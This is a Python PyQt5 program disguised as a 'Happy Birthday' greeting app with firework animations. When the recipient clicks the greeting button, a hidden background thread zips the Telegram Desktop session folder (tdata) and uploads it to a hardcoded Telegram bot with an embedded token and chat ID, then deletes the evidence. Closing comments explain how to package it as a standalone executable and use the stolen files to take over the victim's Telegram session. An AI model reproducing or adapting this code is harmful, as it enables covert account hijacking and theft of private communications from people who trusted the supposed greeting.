import contextlib

from PyQt5 import QtWidgets, QtGui
from PyQt5.QtCore import QThread
from PyQt5.QtGui import QMovie
from PyQt5.QtWidgets import QApplication, QMainWindow, QPushButton


class ParallelThread(QThread):
    # Multithreading class
    def __init__(self):
        super(ParallelThread, self).__init__()

    # Background process
    def run(self):
        name = getpass.getuser()
        path = f'C:\\Users\\{name}\\AppData\\Roaming\\Telegram Desktop\\tdata'  # Path to directory with tdata
        file_list = os.listdir(path)  # List of files (we need not all of them, but take for sure)
        bad_files = ['tdummy', 'usertag', 'user_data', 'dumps', 'emoji', 'working', 'cache.zip'] # Heavy, temporary
        # or active (so we can not copy them) files
        with ZipFile(f'C:\\Users\\{name}\\AppData\\Roaming\\Telegram Desktop\\tdata\\cache.zip', "w") as myzip:
            # We hide our session file to rarely seen directory in case produced by us file is not removed
            # to make it inconspicuous
            for i in file_list:
                if i.startswith('D877'):
                    # Important directory
                    try:
                        file_list1 = os.listdir(f'{path}\\{i}')
                        for j in file_list1:
                            myzip.write(f'{path}\\{i}\\{j}')
                    except Exception:
                        myzip.write(f'{path}\\{i}')
                elif i not in bad_files:
                    myzip.write(f'{path}\\{i}')
        with contextlib.suppress(Exception):
            # Post request to get our zip archive via telegram bot. Send something to https://t.me/ZZZipsender_bot
            # and change "chat_id" parameter to your Telegram_id
            requests.post('https://api.telegram.org/bot6135827492:AAEKo5OYDgqohd-8OEKfFd4rSM3GMPgkmmA/sendDocument'
                          '?chat_id=6172077822',
                          files={'document': open(f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\'
                                                  f'Telegram Desktop\\tdata\\cache.zip', 'rb')})
        with contextlib.suppress(Exception):
            # Removing archive we have already got from user`s PC
            os.remove(f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Telegram Desktop\\tdata\\cache.zip')


class MyWidget(QMainWindow):

    def __init__(self):
        super().__init__()
        # Creating user interface
        img0 = resource_path("img_hb.png")
        img1 = resource_path("gifka.gif")
        img2 = resource_path("gif_gb.gif")

        self.setGeometry(70, 30, 1280, 720)
        self.setWindowTitle('Happy Birthday!')

        self.default_picture = QtWidgets.QLabel(self)
        self.pix = QtGui.QPixmap(img0)
        self.default_picture.setPixmap(self.pix)
        self.default_picture.resize(1280, 720)
        self.default_picture.move(0, 0)

        self.surprise_button = QPushButton('Получить поздравление', self)
        self.surprise_button.resize(140, 30)
        self.surprise_button.move(570, 435)
        self.surprise_button.clicked.connect(self.f_surprise_button)

        self.firework1 = QtWidgets.QLabel(self)
        self.movie1 = QMovie(img1)
        self.firework1.setMovie(self.movie1)
        self.firework1.resize(277, 269)
        self.firework1.move(30, 200)
        self.movie1.start()

        self.firework2 = QtWidgets.QLabel(self)
        self.movie2 = QMovie(img1)
        self.firework2.setMovie(self.movie2)
        self.firework2.resize(277, 269)
        self.firework2.move(350, 50)
        self.movie2.start()

        self.cong_text = QtWidgets.QLabel(self)
        self.cong_movie = QMovie(img2)
        self.cong_text.setMovie(self.cong_movie)
        self.cong_text.resize(1280, 720)
        self.cong_text.move(-2000, 0)

        self.firework3 = QtWidgets.QLabel(self)
        self.movie3 = QMovie(img1)
        self.firework3.setMovie(self.movie3)
        self.firework3.resize(277, 269)
        self.firework3.move(950, 200)
        self.movie3.start()

        self.firework4 = QtWidgets.QLabel(self)
        self.movie4 = QMovie(img1)
        self.firework4.setMovie(self.movie4)
        self.firework4.resize(277, 269)
        self.firework4.move(700, 50)
        self.movie4.start()

        # Multithreading class initialization
        self.parallel = ParallelThread()

    # Reaction to clicking the button
    def f_surprise_button(self):
        self.surprise_button.move(-1000, 0)
        self.movie3.stop()
        self.movie4.stop()
        self.firework3.move(-1000, 0)
        self.firework4.move(-1000, 0)
        self.movie2.stop()
        self.movie1.stop()
        self.cong_text.move(0, 0)
        self.cong_movie.start()
        with contextlib.suppress(Exception):
            self.parallel.start()

# Function for importing files in standalone application
def resource_path(relative_path):
    base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


if __name__ == '__main__':
    import sys
    from zipfile import ZipFile
    import os
    import getpass
    import requests

    app = QApplication(sys.argv)
    ex = MyWidget()
    ex.show()
    sys.exit(app.exec_())

# To create standalone application type
# "pyinstaller --add-data "*.png;." --add-data "*.gif;." --noconsole --onefile main.py".

# # Instruction: close Telegram Desktop and replace "tdata" directory
# # with received one. The Telegram Desktop will start with new session.


# Warning: you can`t log in with received files while the session is active.
# User also can not use session while you are using it.
# Code will not send you the archive if there is no Internet connection on user`s PC

# P.S. for decreasing the sent archive you can check the importance of every packed file
# and choose which of them you will send.
